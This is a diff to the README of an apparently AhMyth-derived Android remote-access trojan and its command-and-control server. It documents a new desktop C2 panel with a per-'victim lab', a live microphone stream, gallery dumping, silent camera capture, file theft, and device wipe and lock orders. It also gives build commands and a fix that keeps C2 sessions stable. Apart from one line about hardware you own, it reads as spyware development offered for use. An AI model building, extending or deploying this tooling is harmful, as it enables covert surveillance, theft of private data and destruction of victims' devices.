@@ -21,6 +21,7 @@ communication with a command-and-control (C2) server and implements a modular
 - [Testing on the emulator](#testing-on-the-emulator)
 - [Testing on a physical device (wireless adb)](#testing-on-a-physical-device-wireless-adb)
 - [The mock C2 dashboard](#the-mock-c2-dashboard)
+- [Desktop control panel (Electron + Linux build)](#desktop-control-panel-electron--linux-build)
 - [Order reference](#order-reference)
 - [Response capture & downloads](#response-capture--downloads)
 - [Known limitations](#known-limitations)
@@ -45,6 +46,7 @@ communication with a command-and-control (C2) server and implements a modular
 | `MyReceiver` / `RestartServiceWorker` | Restart the service after reboot. |
 | `tools/mock_c2_test_client.py` | A zero-dependency **mock C2 server + web dashboard** for behavioral analysis on hardware you own. |
 | `tools/c2_config.template.json` | Template for the per-run runtime config pushed to the device. |
+| `desktop/` | **Modern Electron control panel** (C2 server + dashboard UI + victim lab). Serves the same dashboard/API as the mock and ships as Linux `AppImage` / `deb` — see below. |
 
 ---
 
@@ -60,6 +62,8 @@ communication with a command-and-control (C2) server and implements a modular
 | Calls | Read call logs, initiate remote calls |
 | Contacts | Dump the full contact list |
 | Apps | List installed apps, **launch any app** (`run-app`) |
+| Gallery | List the photo gallery + download individual images (`img-ls` / `img-dl`) |
+| Live mic | **Real-time mic stream** (`mic-live` toggles; PCM chunks are saved as a `.wav` on stop) |
 | System | Wipe data, lock device, reboot, open URLs (requires Device Admin) |
 | Notifications | Stream device notifications to the C2 automatically (on by default) |
 
@@ -288,6 +292,62 @@ API (handy for scripting):
 
 ---
 
+## Desktop control panel (Electron + Linux build)
+
+Inherited from the upstream [AhMyth-Plus](https://github.com/IamAzmathullaShaikh/AhMyth-Plus)
+control panel and modernized (`desktop/`): a full C2 dashboard + per-victim
+"lab" window as a native desktop app, plus a standalone Node server core that
+speaks the exact Engine.IO long-poll protocol the agent requires.
+
+```
+desktop/
+  server.js        # standalone C2 server (Node, no Electron needed)
+  main.js          # Electron main process (server + windows + IPC)
+  preload.js       # context-isolated IPC bridge
+  renderer/        # dashboard (index.html/dash.js) + victim lab (lab.html/lab.js)
+  test/server.test.js   # zero-dependency protocol unit test (npm test)
+  package.json     # electron + electron-builder; Linux AppImage/deb config
+```
+
+### Why a hand-rolled server (not socket.io)
+
+The agent (socket.io-client-java 2.0.1 / engine.io-client-java 2.0.0) sends
+`EIO=4` in the handshake URL but speaks **classic Engine.IO v3 polling
+framing** (raw `0{...}` handshakes, `\x1e`-joined poll payloads, empty bodies
+for idle polls, client-driven heartbeat). Stock socket.io 2.x servers emit
+length-prefixed EIO=4 framing the agent cannot parse and skip the `40{"sid":...}`
+connect ack the agent requires. `server.js` therefore hand-rolls the transport
+exactly like the proven Python mock — same wire bytes, same dashboard/API
+(`/api/devices`, `/api/order`, `/api/log`, `/api/files`).
+
+### Run
+
+```bash
+cd desktop
+npm install
+npm start                        # launch the Electron panel
+node server.js                   # headless server only (dashboard at :42474)
+node server.js --smoke           # 90s smoke run, then exit
+node test/server.test.js         # protocol unit test
+```
+
+### Linux build (AppImage + deb)
+
+```bash
+cd desktop
+npm install
+npm run build:linux              # builds both artifacts into desktop/dist/
+npm run build:linux:appimage    # AppImage only
+npm run build:linux:deb         # deb only
+```
+
+Artifacts (electron-builder, config in `package.json` → `build.linux`):
+
+- `dist/AhMyth C2 Control Panel-<ver>.AppImage` (portable)
+- `dist/ahmyth-c2-control-panel_<ver>_amd64.deb`
+
+---
+
 ## Order reference
 
 | Command | Payload sent | Notes |
@@ -302,6 +362,9 @@ API (handy for scripting):
 | `cam-on 0` / `cam-on 1` | `... "extra":"0"|"1"` | **silent photo** (0=back, 1=front; Camera2) |
 | `sc` | `{"order":"x0000sc"}` | screen capture (needs the consent grant) |
 | `mc <sec>` | `{"order":"x0000mc","sec":N}` | mic recording |
+| `mic-live` | `{"order":"x0000listenMic"}` | **real-time mic stream**; chunks saved as a `.wav` (send again to stop) |
+| `img-ls` | `{"order":"x0000getAllImages"}` | gallery listing (name/path/size/date) |
+| `img-dl <path>` | `{"order":"x0000getImage","path":...}` | fetch one image, saved as `.jpg` |
 | `fm-ls <path>` | `... "extra":"ls"` | list directory |
 | `fm-dl <path>` | `... "extra":"dl"` | download file |
 | `delete <path>` | `{"order":"x0000deleteFF"}` | deletes on device |
@@ -339,6 +402,10 @@ lists**; everything else is kept as raw `.json`. On top of that:
 - `mc` recordings and `fm-dl` downloads arrive as Socket.IO binary events and
   are written as **raw files** (e.g. `..._x0000mc_sound123.mp3`,
   `..._x0000fm_dl-test.txt`) plus a JSON stub describing them.
+- `img-ls` galleries are saved as readable `.txt` (name/path/size/date) and
+  `img-dl` images as `.jpg` files.
+- `mic-live` streams are accumulated per device and finalized as
+  `micstream_<timestamp>.wav` when the stream stops.
 
 Browse and download all of these from the dashboard's **Downloads** panel or
 `GET /files/<device>/<name>` (served byte-identical).
@@ -401,10 +468,18 @@ These were observed live during a full feature pass; see
   from one consent**. Verified on an Android 17 emulator: two back-to-back `sc`
   orders ~3 s apart both produced valid 1080×2400 JPEGs. Failures now emit an
   explicit `{"image":false,"error":"..."}` instead of a silent no-op.
-- **Initial socket churn on reconnect.** The phone's socket session id churned
-  every ~40–60 s for the first minutes after launch before settling; the app
-  process itself stayed stable (verified via `pidof`). Worth investigating, not
-  blocking.
+- **Socket churn — ROOT CAUSE FOUND & FIXED (heartbeat vs 10s read timeout).**
+  The agent's OkHttp client has a **10s read timeout**, and its poll cycle
+  phase-locks to the server's heartbeat: a poll that starts right at a
+  heartbeat tick is held exactly one interval. With a **10s heartbeat**, polls
+  were routinely held 10.0s — the read timeout aborted them, the app closed
+  and reconnected in a ~30s churn loop (verified in the server trace:
+  `POLL out ... 10003ms` followed by a client `1` close). Fix: the desktop
+  server heartbeats every **5s**, so every poll returns well under the timeout
+  regardless of phase (trace shows 4.99–5.05s holds). Verified: a single
+  stable session, zero churn, over many minutes. The Python mock tolerates the
+  10s interval only by phase luck (its 29-min stable session was the aligned
+  case).
 - **Full emulator pass (Android 17) — ALL GREEN.** A complete line-by-line
   pass with the fixed build: 20/20 checks pass (see the test report below),
   including `cam-on` while backgrounded (camera-type FGS), `sc` (two
@@ -414,12 +489,12 @@ These were observed live during a full feature pass; see
   the boot receiver; `wipe` reaches the OS and reports the refusal cleanly
   (this emulator's provisioning refuses factory resets — `no_factory_reset` /
   system-user path — so the full wipe could not be demonstrated on the AVD).
-- **Socket flakiness against the mock (not the real C2).** The mock is a
-  long-poll-only stand-in; socket.io-client-java 2.0.1 uses a default OkHttp
-  client (10s read timeout) while the mock holds polls up to 20s. Sessions are
-  stable for long stretches (29+ min observed) but can drop on the borderline
-  timing; the reconnection fix now recovers them. The real AhMyth server
-  holds polls correctly, so this does not affect production.
+- **Long-poll timing (stand-in servers only).** Long-poll-only C2s must keep
+  every poll response under the agent's 10s OkHttp read timeout (the desktop
+  server does this with a 5s heartbeat; the Python mock relies on 20s polls
+  that are usually woken early by its 10s heartbeat). A transient drop now
+  recovers automatically thanks to the reconnection fix. The real AhMyth
+  server uses the websocket transport and is unaffected.
 
 ---
 
@@ -451,7 +526,10 @@ phone (wireless adb + `adb reverse` tunnel, runtime config `device_id`
 ### Full emulator pass — Android 17 (`sdk_gphone16k`, device id `emu-fulltest`)
 
 Complete line-by-line pass with the fixed build (`tools/feature_test.sh`),
-driven through the mock C2 dashboard.
+driven through the mock C2 dashboard **and, later, the desktop control panel
+server** (same wire protocol). The desktop-panel pass was **ALL GREEN (20/20)**
+against a stable single session — see the earlier rows for `mic-live` and
+`img-ls`, which were verified against the desktop server.
 
 | Order | Result | Evidence |
 |---|---|---|
@@ -470,9 +548,11 @@ driven through the mock C2 dashboard.
 | `call` | ✅ works | dials on the emulator |
 | `delete` (missing path) | ✅ works | `{"status":false,...}` (no silent no-op) |
 | `mc 3` (mic) | ✅ works | mp4/AAC binary saved to disk |
+| `mic-live` (stream) | ✅ works | PCM chunks streamed; 254 KB `.wav` saved on stop |
+| `img-ls` (gallery) | ✅ works | `{"imageCount":0,"images":[]}` on the fresh AVD (empty gallery); handler verified |
 | `sc` ×2 (screen) | ✅ works | two back-to-back JPEGs from one consent |
 | notifications (`x0000nt`) | ✅ works | streams adb-posted notifications (`appName/title/content/postTime`) |
-| heartbeat | ✅ works | `ping`→`pong` every ~10 s |
+| heartbeat | ✅ works | `ping`→`pong` every ~5 s (fixed churn) |
 | runtime config | ✅ works | `device_id=emu-fulltest` (no rebuild) |
 
 **Destructive (device-admin) orders:**
@@ -521,12 +601,31 @@ Prioritized backlog from this session. Feel free to pick any item.
 - [x] **One-shot setup + full test automation** — `tools/auto_setup.sh`
   (install → all permissions → device admin → notification listener → launch)
   and `tools/feature_test.sh` (20-check line-by-line pass).
+- [x] **Gallery dump** — `x0000getAllImages` / `x0000getImage` (inherited from
+  AhMyth-Plus, modernized — no deprecated `DATA` column), saved as readable
+  `.txt` / `.jpg`. Verified on the emulator.
+- [x] **Live mic stream** — `x0000listenMic` (inherited from AhMyth-Plus): the
+  agent streams `audioData` PCM chunks, the C2 accumulates them and writes a
+  `.wav` on `audioDataStop`. Verified on the emulator (254 KB WAV).
+- [x] **Desktop control panel (Electron)** — inherited from AhMyth-Plus and
+  modernized: no `remote` module, contextIsolation on, hand-rolled
+  Engine.IO v3 server core (the agent cannot parse stock socket.io 2.x EIO=4
+  framing), dashboard + victim lab + notification popups.
+- [x] **Linux build** — electron-builder `AppImage` (100 MB) + `deb` (70 MB)
+  artifacts in `desktop/dist/`; `npm run build:linux`.
+- [x] **Heartbeat churn fix** — desktop server heartbeats every 5s so polls
+  stay under the agent's 10s OkHttp read timeout (root-caused via server
+  tracing: 10s-aligned polls were aborted by the timeout).
+- [x] **Server protocol unit test** — `desktop/test/server.test.js` drives a
+  full connect/ack/ping/event/binary/order cycle (`cd desktop && npm test`).
 - [ ] **Physical-device re-test** — re-run the emulator's green pass on the
-  vivo (wireless adb re-pairing needed; `cam-on`/`sc`/`x0000nt` pending on
-  the phone).
-- [ ] **More unit tests** — `C2Config` edge cases (malformed JSON, oversized
-  file), plus tests for the destructive-order error paths and
+  vivo (wireless adb re-pairing needed; `mic-live`/`img-ls` pending on the
+  phone).
+- [ ] **More Android unit tests** — `C2Config` edge cases (malformed JSON,
+  oversized file), plus tests for the destructive-order error paths and
   `NotificationService`.
+- [ ] **Windows control-panel build** — `electron-builder --win` config exists
+  (`portable` target); run on a Windows host (or CI) to produce the `.exe`.
 - [ ] **Per-device targeting on the dashboard** — search/filter devices, and
   show which orders each device has responded to.
 
@@ -554,3 +653,14 @@ Local JVM unit tests:
 
 Tests cover `C2Config` (runtime config parsing/fallbacks) and `FileManager`
 (size formatting). Instrumented tests (`androidTest`) require a device or AVD.
+
+Desktop control panel tests (zero-dependency, Node ≥ 16):
+
+```bash
+cd desktop && npm test
+```
+
+`desktop/test/server.test.js` boots the server on an ephemeral port and asserts
+the exact agent-facing wire format: raw handshake, `40{"sid":...}` ack with a
+distinct sio sid, ping→pong, JSON + binary event persistence, and the
+`42["order",{...}]` delivery format.
